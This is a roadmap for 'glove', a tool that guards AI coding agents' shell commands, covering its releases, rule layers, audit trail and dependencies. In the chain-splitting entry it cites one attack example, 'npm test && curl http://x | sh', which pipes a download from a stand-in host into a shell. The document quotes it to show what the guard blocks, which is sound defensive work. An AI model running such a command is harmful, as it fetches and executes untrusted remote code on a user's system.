# Roadmap

Status per release is in [`RELEASE.md`](RELEASE.md) (roll-up) and `RELEASE/vX.Y.Z.md` files (detail). This file is the order and the reasons. Requirements live in [`PRD.md`](PRD.md) §7 (one shippable minor per step); decisions in [`docs/adr/`](docs/adr/).

## Release train (v0.1.0 to v1.0.0 — 0.3.0–0.6.0 consolidated on 2026-11-04; re-expanded 2026-11-05 with 0.7.0 SIEM-ready, 0.8.0 correlation+fleet, 0.9.0 last RC — the audit-schema evolution must land before the 1.0.0 freeze)

1. **0.1 Claude Code + Layer 0** (built, `ready`). A working guard on one agent with deterministic rules only: hard-block / force-confirm / protected paths, `hook` + `check` + `install`, config diff + backup. The risky part first — the adapter contract (§5.1) and the frozen `contract.Verdict` (§5.3) must hold before anything smarter lands.
2. **0.2 Layer 1: chain splitting** (built, `ready`). Shell-aware splitting (`&&`, `||`, `;`, `|`, `&`, newlines, `$(...)`), worst-part-wins across segments, composition rules over pipe pairs, `--explain` per segment. This is where composition attacks (`npm test && curl http://x | sh`) stop working.
3. **0.3 Audit + policy.** Observability AND tuning before intelligence: audit JSONL with rotation and default redaction (zero plaintext), query/export, plus the `policy.toml` engine (project > user > built-in precedence, `policy validate` with line numbers, `--fast`). Users see and tune the Layer 0+1 false-positive rate in the wild before the model arrives.
4. **0.4 Layer 2: Laya + `serve`.** The flagship capability — semantic judgment for gray areas with calibrated confidence, four typed questions, and the "only ever tightens" invariant enforced in code (§4.2). **Load-bearing assumption to probe before building:** CPU inference of the ~644 MB GGUF must fit the `CGO_ENABLED=0` static-binary constraint (PRD §8) — typical llama.cpp bindings use cgo. Probe pure-Go GGUF runners vs. a bundled sidecar binary before writing `internal/server/laya_runtime.go`; record the outcome as ADR 3.
5. **0.5 Adapter matrix** (built, `ready`). Kilo first (structurally different — proves the abstraction), then Codex + OpenCode (same lineage), then Cursor, Gemini CLI, Zed (audit-only, documented honestly). The conformance suite (`internal/adapter/` harness + `testdata/conformance/`) is the gate every adapter passes; README coverage matrix machine-verified by `glove list --matrix --check`. Live-session smoke checks for the six agents remain with the user before tagging.
6. **0.6 Release candidate** (built, `ready`). No new features. Cross-platform CI matrix (windows/amd64 job + cross-compile proof; full perf gates stay on the POSIX runners), release pipeline covering all five §8 platforms with verified checksums (`checksums.txt`) and scripted signing (`scripts/sign-release.sh`), the error-handling audit (`docs/failure-modes.md`, contract-checked) with fuzz-proven fail-closed hooks, Windows path hardening, benchmark suite (`benchmarks/`) + soak at three levels. External proofs pending the maintainer: the two-week CI streak, signing certificates, the fresh-VM outside-tester pass, the 24h live soak.
7. **0.7 SIEM-ready** (built, tag pending). The audit trail becomes evidence a SIEM can trust: per-record hash chain + `glove audit verify` (tamper-evident), MITRE ATT&CK tags on rules inherited by records, machine identity fields, CEF/ECS export, and an off-by-default async outbound sink (file / syslog RFC 5424 / webhook) — post-decision only, never on the decision path, ADR 4 records the boundary. Exists because 1.0.0 freezes the audit JSONL schema: schema evolution must land in 0.x.
8. **0.8 Correlation + fleet** (built, tag pending). Session escalation correlation (tighten-only, derived from the audit trail), `glove audit stats`, checksum-verified policy bundles for org baselines — still local.
9. **0.9 Last RC** (built, tag pending). Distribution promises from §9 shipped (checksum-verified install script, Homebrew formula with a layout contract test), a fresh hardening pass over the 0.7/0.8 surface (failure-modes sections + fail-closed hammering, sink/verify bench in `benchmarks/README.md`), `CHANGELOG.md` consolidation with a drift gate.
10. **1.0 Stability marker** (planned — `RELEASE/v1.0.0.md` written: the promise, the four frozen contracts, and the parity/migration ACs). Version bump only. Freezes `contract.Verdict`, CLI surface, `policy.toml` schema, audit JSONL schema. Consolidated `CHANGELOG.md` generated from `RELEASE.md` §4. Ships after the external proofs land (CI streak, signing, outside-tester pass, 24h soak — carried since 0.6.0).

Not scheduled: any new agent beyond the eight declared; remote/cloud *decisioning* (PRD §3.3 — the decision path stays zero-network; the 0.7.0 sink is post-decision, opt-in, off by default, its delivery never affects a verdict); prompt-level guardrails (only `tool_name` + `tool_input` are ever evaluated).

## Guardrails (PRD §10.4, binding at every step)

- No Layer 2 code before 0.4.0; no audit or policy engine before 0.3.0.
- No new adapter without extending the conformance suite; inside 0.5.0, Kilocode ships before the structurally-similar adapters.
- No `contract.Verdict` field change without a documented schema-version bump and owner sign-off.
- No PR merges an install that doesn't show a config diff.
- No outbound-sink code before ADR 4 (the decision-path boundary) is recorded; the sink is post-decision, opt-in, off by default.
- Do not proceed past a release's acceptance criteria until they all pass (0.1.0's boxes: PRD §10.5).

## Platform: what glove depends on

| Dependency | State | glove action |
|---|---|---|
| Go toolchain | **1.27.3** (go.mod, CI `GO_VERSION`, Dockerfile builder) | `CGO_ENABLED=0`, `-trimpath`, version via `-X`; NFR binary budget ≤ 15 MB stripped |
| `spf13/cobra` v1.10.2 | stable | CLI; locked in `RELEASE.md` §1 |
| Laya multilingual GGUF (~644 MB) | to verify at 0.4.0 | downloaded once at first `serve`, SHA-256 from release metadata, `--model-path` for airgapped; **cgo conflict flagged above** |
| HTTP layer for `serve` (0.4.0) | stdlib `net/http` first | one internal endpoint (`POST /evaluate`); chi only if middleware needs demand it (ADR 2 scope note) |
| Agent hook surfaces (§11) | move | each adapter re-verifies its agent's docs during that version's implementation; a protocol change touches one file |
| CI scanners | semgrep (vendored rules), govulncheck, trivy | `.semgrep/rules.yaml` extends; never re-add registry packs |
